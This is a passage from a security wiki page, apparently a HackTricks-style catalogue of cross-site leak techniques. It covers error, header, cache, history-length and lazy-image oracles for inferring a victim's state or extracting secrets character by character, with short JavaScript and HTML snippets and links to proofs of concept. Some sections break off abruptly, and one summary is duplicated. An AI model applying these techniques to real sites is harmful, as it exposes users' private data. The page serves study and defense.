  \ content, thereby deducing the response status of a cross-origin resource.\n\n### CORS Error\n\n- **Inclusion Methods**:\
  \ Fetch API\n- **Detectable Difference**: Header\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.3)\n- **Summary:** In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected\
  \ requests.\n- **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)\n\
  \nThis technique enables an attacker to **extract the destination of a cross-origin site's redirect** by exploiting how\
  \ Webkit-based browsers handle CORS requests. Specifically, when a **CORS-enabled request** is sent to a target site that\
  \ issues a redirect based on user state and the browser subsequently denies the request, the **full URL of the redirect's\
  \ target** is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also\
  \ exposes the redirect's endpoint and any **sensitive query parameters** it may contain.\n\n### SRI Error\n\n- **Inclusion\
  \ Methods**: Fetch API\n- **Detectable Difference**: Header\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.3)\n- **Summary:** In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected\
  \ requests.\n- **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)\n\
  \nAn attacker can exploit **verbose error messages** to deduce the size of cross-origin responses. This is possible due\
  \ to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched,\
  \ often from CDNs, haven't been tampered with. For SRI to work on cross-origin resources, these must be **CORS-enabled**;\
  \ otherwise, they're not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an\
  \ error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately **trigger\
  \ this error** by assigning a **bogus hash value** to the integrity attribute of any request. In SA, the resulting error\
  \ message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker\
  \ to discern variations in response size, paving the way for sophisticated XS-Leak attacks.\n\n### CSP Violation/Detection\n\
  \n- **Inclusion Methods**: Pop-ups\n- **Detectable Difference**: Status Code\n- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737),\
  \ [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html),\
  \ [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)\n\
  - **Summary:** Allowing only the victims website in the CSP if we accessed it tries to redirect to a different domain the\
  \ CSP will trigger a detectable error.\n- **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak),\
  \ [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)\n\
  \nA XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect\
  \ the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to **allow the\
  \ target domain on the attacker site**. Once a request is issued to the target domain, it **redirects** to a cross-origin\
  \ domain. **CSP blocks** the access to it and creates a **violation report used as a leak technique**. Depending on the\
  \ browser, **this report may leak the target location of the redirect**.\\\nModern browsers won't indicate the URL it was\
  \ redirected to, but you can still detect that a cross-origin redirect was triggered.\n\n### Cache\n\n- **Inclusion Methods**:\
  \ Frames, Pop-ups\n- **Detectable Difference**: Page Content\n- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events),\

  - **Summary:** Clear the file from the cache. Opens target page checks if the file is present in the cache.\n- **Code Example:**\n\
  \nBrowsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target\
  \ page has **requested a specific file**.\n\nIf a page loads an image only if the user is logged in, you can **invalidate**\
  \ the **resource** (so it's no longer cached if it was, see more info links), **perform a request** that could load that\
  \ resource and try to load the resource **with a bad request** (e.g. using an overlong referer header). If the resource\
  \ load **didn't trigger any error**, it's because it was **cached**.\n\n### CSP Directive\n\n- **Inclusion Methods**: Frames\n\
  - **Detectable Difference**: Header\n- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)\n\
  - **Summary:** CSP header directives can be probed using the CSP iframe attribute, revealing policy details.\n- **Code Example**:\
  \ [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)\n\
  \nA novel feature in Google Chrome (GC) allows web pages to **propose a Content Security Policy (CSP)** by setting an attribute\
  \ on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must\
  \ **authorize this via an HTTP header**, or an **error page is displayed**. However, if the iframe is already governed by\
  \ a CSP and the newly proposed policy isn't more restrictive, the page will load normally. This mechanism opens a pathway\
  \ for an attacker to **detect specific CSP directives** of a cross-origin page by identifying the error page. Although this\
  \ vulnerability was marked as fixed, our findings reveal a **new leak technique** capable of detecting the error page, suggesting\
  \ that the underlying problem was never fully addressed.\n\n### **CORP**\n\n- **Inclusion Methods**: Fetch API\n- **Detectable\
  \ Difference**: Header\n- **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)\n\
  - **Summary:** Resources secured with Cross-Origin Resource Policy (CORP) will throw an error when fetched from a disallowed\
  \ origin.\n- **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)\n\
  \nThe CORP header is a relatively new web platform security feature that when set b**locks no-cors cross-origin requests\
  \ to the given resource**. The presence of the header can be detected, because a resource protected with CORP will **throw\
  \ an error when fetched**.\n\n### CORB\n\n- **Inclusion Methods**: HTML Elements\n- **Detectable Difference**: Headers\n\
  - **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)\n\
  - **Summary**: CORB can allow attackers to detect when the **`nosniff` header is present** in the request.\n- **Code Example**:\
  \ [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)\n\nCheck the link for more\
  \ information about the attack.\n\n### CORS error on Origin Reflection misconfiguration <a href=\"#cors-error-on-origin-reflection-misconfiguration\"\
  \ id=\"cors-error-on-origin-reflection-misconfiguration\"></a>\n\n- **Inclusion Methods**: Fetch API\n- **Detectable Difference**:\
  \ Headers\n- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)\n\
  - **Summary**: If the Origin header is reflected in the header `Access-Control-Allow-Origin` it's possible to check if a\
  \ resource is in the cache already.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)\n\
  \nIn case the **Origin header** is being **reflected** in the header `Access-Control-Allow-Origin` an attacker can abuse\
  \ this behaviour to try to **fetch** the **resource** in **CORS** mode. If an **error** **isn't** triggered, it means that\
  \ it was **correctly retrieved form the web**, if an error is **triggered**, it's because it was **accessed from the cache**\
  \ (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers\
  \ domain)**.**\\\nNote that if the origin isn't reflected but a wildcard is used (`Access-Control-Allow-Origin: *`) this\
  \ won't work.\n\n## Readable Attributes Technique\n\n### Fetch Redirect\n\n- **Inclusion Methods**: Fetch API\n- **Detectable\
  \ Difference**: Status Code\n- **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)\n\
  - **Summary:** GC and SA allow to check the response’s type (opaque-redirect) after the redirect is finished.\n- **Code\
  \ Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)\n\
  \nSubmitting a request using the Fetch API with `redirect: \"manual\"` and other params, it's possible to read the `response.type`\
  \ attribute and if it's equals to `opaqueredirect` then the response was a redirect.\n\n### COOP\n\n- **Inclusion Methods**:\
  \ Pop-ups\n- **Detectable Difference**: Header\n- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
  \ (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)\n- **Summary:**\
  \ Pages safeguarded by Cross-Origin Opener Policy (COOP) prevent access from cross-origin interactions.\n- **Code Example**:\
  \ [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)\n\nAn attacker is capable\
  \ of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized\
  \ by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header\
  \ can be discerned by attempting to access the **`contentWindow` reference**. In scenarios where COOP is applied conditionally,\
  \ the **`opener` property** becomes a telltale indicator: it's **undefined** when COOP is active, and **defined** in its\
  \ absence.\n\n### URL Max Length - Server Side\n\n- **Inclusion Methods**: Fetch API, HTML Elements\n- **Detectable Difference**:\
  \ Status Code / Content\n- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)\n\
  - **Summary:** Detect differences in responses because of the redirect response length migt be too large that the server\
  \ replays with an error and an alert is generated.\n- **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)\n\
  \nIf a server-side redirect uses **user input inside the redirection** and **extra data**. It's possible to detect this\
  \ behaviour because usually **servers** has a **limit request length**. If the **user data** is that **length - 1**, because\
  \ the **redirect** is using **that data** and **adding** something **extra**, it will trigger an **error detectable via\
  \ Error Events**.\n\nIf you can somehow set cookies to a user, you can also perform this attack by **setting enough cookies**\
  \ ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) so with the **response increased size** of the **correct response**\
  \ an **error** is triggered. In this case, remember that is you trigger this request from a same site, `<script>` will automatically\
  \ send the cookies (so you can check for errors).\\\nAn example of the **cookie bomb + XS-Search** can be found in the Intended\
  \ solution of this writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)\n\

  - **Summary:** Detect differences in responses because of the redirect response length might too large for a request that\
  \ a difference can be noticed.\n- **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)\n\
  \nAccording to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length),\
  \ Chrome's maximum URL length is 2MB.\n\n> In general, the _web platform_ does not have limits on the length of URLs (although\
  \ 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing\
  \ denial-of-service problems in inter-process communication.\n\nTherefore if the **redirect URL responded is larger in one\
  \ of the cases**, it's possible to make it redirect with a **URL larger than 2MB** to hit the **length limit**. When this\
  \ happens, Chrome shows an **`about:blank#blocked`** page.\n\nThe **noticeable difference**, is that if the **redirect**\
  \ was **completed**, `window.origin` throws an **error** because a cross origin cannot access that info. However, if the\
  \ **limit** was  hit and the loaded page was **`about:blank#blocked`** the window's **`origin`** remains that of the **parent**,\
  \ which is an **accessible information.**\n\nAll the extra info needed to reach the **2MB** can be added via a **hash**\
  \ in the initial URL so it will be **used in the redirect**.\n\n\n{{#ref}}\nxs-search/url-max-length-client-side.md\n{{#endref}}\n\

  \ of a frame/popup is in an specific URL abusing the history length.\n- **Code Example**: Below\n\nAn attacker could use\
  \ JavaScript code to **manipulate the frame/pop-up location to a guessed one** and **immediately** **change it to `about:blank`**.\
  \ If the history length increased it means the URL was correct and it had time to **increase because the URL isn't reloaded\
  \ if it's the same**. If it didn't increased it means it **tried to load the guessed URL** but because we **immediately\
  \ after** loaded **`about:blank`**, the **history length did never increase** when loading the guessed url.\n\n```javascript\n\
  async function debug(win, url) {\n  win.location = url + \"#aaa\"\n  win.location = \"about:blank\"\n  await new Promise((r)\
  \ => setTimeout(r, 500))\n  return win.history.length\n}\n\nwin = window.open(\"https://example.com/?a=b\")\nawait new Promise((r)\

  \ which can be accessed via its API. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)\n\
  - **HTMLVideoElement**: It exposes `videoHeight` and `videoWidth`. In some browsers, additional properties like `webkitVideoDecodedByteCount`,\
  \ `webkitAudioDecodedByteCount`, and `webkitDecodedFrameCount` are available, offering more in-depth information about the\

  - **Summary:** Detect if the `:visited` style is applied to an URL indicating it was already visited\n- **Code Example**:\
  \ [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)\n\
  \n> [!TIP]\n> According to [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), this is not working\
  \ in headless Chrome.\n\nThe CSS `:visited` selector is utilized to style URLs differently if they have been previously\
  \ visited by the user. In the past, the `getComputedStyle()` method could be employed to identify these style differences.\
  \ However, modern browsers have implemented security measures to prevent this method from revealing the state of a link.\
  \ These measures include always returning the computed style as if the link were visited and restricting the styles that\
  \ can be applied with the `:visited` selector.\n\nDespite these restrictions, it's possible to discern the visited state\
  \ of a link indirectly. One technique involves tricking the user into interacting with an area affected by CSS, specifically\
  \ utilizing the `mix-blend-mode` property. This property allows the blending of elements with their background, potentially\
  \ revealing the visited state based on user interaction.\n\nFurthermore, detection can be achieved without user interaction\
  \ by exploiting the rendering timings of links. Since browsers may render visited and unvisited links differently, this\
  \ can introduce a measurable time difference in rendering. A proof of concept (PoC) was mentioned in a Chromium bug report,\
  \ demonstrating this technique using multiple links to amplify the timing difference, thereby making the visited state detectable\
  \ through timing analysis.\n\nFor further details on these properties and methods, visit their documentation pages:\n\n\

  - **Summary:** In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin\
  \ site due to X-Frame-Options restrictions.\n- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)\n\
  \nIn Chrome, if a page with the `X-Frame-Options` header set to \"deny\" or \"same-origin\" is embedded as an object, an\
  \ error page appears. Chrome uniquely returns an empty document object (instead of `null`) for the `contentDocument` property\
  \ of this object, unlike in iframes or other browsers. Attackers could exploit this by detecting the empty document, potentially\
  \ revealing information about the user's state, especially if developers inconsistently set the X-Frame-Options header,\
  \ often overlooking error pages. Awareness and consistent application of security headers are crucial for preventing such\
  \ leaks.\n\n### Download Detection\n\n- **Inclusion Methods**: Frames, Pop-ups\n- **Detectable Difference**: Headers\n-\
  \ **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)\n\
  - **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies\
  \ successful file download.\n- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)\n\
  \nThe `Content-Disposition` header, specifically `Content-Disposition: attachment`, instructs the browser to download content\
  \ rather than display it inline. This behavior can be exploited to detect whether a user has access to a page that triggers\
  \ a file download. In Chromium-based browsers, there are a few techniques to detect this download behavior:\n\n1. **Download\
  \ Bar Monitoring**:\n   - When a file is downloaded in Chromium-based browsers, a download bar appears at the bottom of\
  \ the browser window.\n   - By monitoring changes in the window height, attackers can infer the appearance of the download\
  \ bar, suggesting that a download has been initiated.\n2. **Download Navigation with Iframes**:\n   - When a page triggers\
  \ a file download using the `Content-Disposition: attachment` header, it does not cause a navigation event.\n   - By loading\
  \ the content in an iframe and monitoring for navigation events, it's possible to check if the content disposition causes\
  \ a file download (no navigation) or not.\n3. **Download Navigation without Iframes**:\n   - Similar to the iframe technique,\
  \ this method involves using `window.open` instead of an iframe.\n   - Monitoring navigation events in the newly opened\
  \ window can reveal whether a file download was triggered (no navigation) or if the content is displayed inline (navigation\
  \ occurs).\n\nIn scenarios where only logged-in users can trigger such downloads, these techniques can be used to indirectly\
  \ infer the user's authentication state based on the browser's response to the download request.\n\n### Partitioned HTTP\

  \n> [!WARNING]\n> This is why this technique is interesting: Chrome now has **cache partitioning**, and the cache key of\
  \ the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open\
  \ an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`,\
  \ the **cache key is different**, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy\
  \ by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\\\n> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))\n\
  \nIf a site `example.com` includes a resource from `*.example.com/resource` then that resource will have the **same caching\
  \ key** as if the resource was directly **requested through top-level navigation**. That is because the caching key is consisted\
  \ of top-level _eTLD+1_ and frame _eTLD+1_.\n\nBecause accessing the cache is faster than loading a resource, it's possible\
  \ to try to change the location of a page and cancel it 20ms (for example) after. If the origin was changed after the stop,\
  \ it means that the resource was cached.\\\nOr could just **send some fetch to the pontentially cached page and measure\
  \ the time it takes**.\n\n### Manual Redirect <a href=\"#fetch-with-abortcontroller\" id=\"fetch-with-abortcontroller\"\

  \nUse _**fetch**_ and _**setTimeout**_ with an **AbortController** to both detect whether the **resource is cached** and\

  \n## With HTML or Re Injection\n\nHere you can find techniques to exfiltrate information from a cross-origin HTML **injecting\
  \ HTML content**. These techniques are interesting in cases where for any reason you can **inject HTML but you cannot inject\
  \ JS code**.\n\n### Dangling Markup\n\n\n{{#ref}}\ndangling-markup-html-scriptless-injection/\n{{#endref}}\n\n### Image\
  \ Lazy Loading\n\nIf you need to **exfiltrate content** and you can **add HTML previous to the secret** you should check\
  \ the **common dangling markup techniques**.\\\nHowever, if for whatever reason you **MUST** do it **char by char** (maybe\
  \ the communication is via a cache hit) you can use this trick.\n\n**Images** in HTML has a \"**loading**\" attribute whose\
  \ value can be \"**lazy**\". In that case, the image will be loaded when it's viewed and not while the page is loading:\n\
  \n```html\n<img src=/something loading=lazy >\n```\n\nTherefore, what you can do is to **add a lot of junk chars** (For\
  \ example **thousands of \"W\"s**) to **fill the web page before the secret or add something like** `<br><canvas height=\"\
  1850px\"></canvas><br>.`\\\nThen if for example our **injection appear before the flag**, the **image** would be **loaded**,\
  \ but if appears **after** the **flag**, the flag + the junk will **prevent it from being loaded** (you will need to play\
  \ with how much junk to place). This is what happened in [**this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).\n\
  \nAnother option would be to use the **scroll-to-text-fragment** if allowed:\n\n#### Scroll-to-text-fragment\n\nHowever,\
  \ you make the **bot access the page** with something like\n\n```\n#:~:text=SECR\n```\n\nSo the web page will be something\
  \ like: **`https://victim.com/post.html#:~:text=SECR`**\n\nWhere post.html contains the attacker junk chars and lazy load\
  \ image and then the secret of the bot is added.\n\nWhat this text will do is to make the bot access any text in the page\
  \ that contains the text `SECR`. As that text is the secret and it's just **below the image**, the **image will only load\
  \ if the guessed secret is correct**. So there you have your oracle to **exfiltrate the secret char by char**.\n\nSome code\
  \ example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)\n\
  \n### Image Lazy Loading Time Based\n\nIf it's **not possible to load an external image** that could indicate the attacker\
  \ that the image was loaded, another option would be to try to **guess the char several times and measure that**. If the\
  \ image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the [**solution\
  \ of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumarized here:**\n\n\n\

  {{#endref}}\n\n### CSS ReDoS\n\nIf `jQuery(location.hash)` is used, it's possible to find out via timing i**f some HTML\
  \ content exists**, this is because if the selector `main[id='site-main']` doesn't match it doesn't need to check the rest\
  \ of the **selectors**:\n\n```javascript\n$(\n  \"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']\"\
  \n)\n```\n\n### CSS Injection\n\n\n{{#ref}}\nxs-search/css-injection/\n{{#endref}}\n\n## Defenses\n\nThere are mitigations\
  \ recommended in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) also in each section of the wiki [https://xsleaks.dev/](https://xsleaks.dev/).\
  \ Take a look there for more information about how to protect against these techniques.\n\n## References\n\n- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\n\
